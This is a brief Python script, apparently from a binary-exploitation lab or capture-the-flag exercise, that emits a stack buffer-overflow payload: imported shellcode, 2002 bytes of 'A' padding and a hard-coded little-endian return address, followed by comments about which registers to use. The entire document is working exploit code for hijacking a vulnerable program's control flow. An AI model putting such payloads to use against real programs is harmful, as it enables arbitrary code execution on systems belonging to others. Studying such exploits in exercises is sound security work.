#!/usr/bin/env python3

import sys

from shellcode import shellcode

sys.stdout.buffer.write(shellcode+b'A'*2002+(0x7ffffff6cd10).to_bytes(8,"little"))

# need to write into a tmp register and then access 
# tmp: rbx, rdx, rcx, rdi, rsi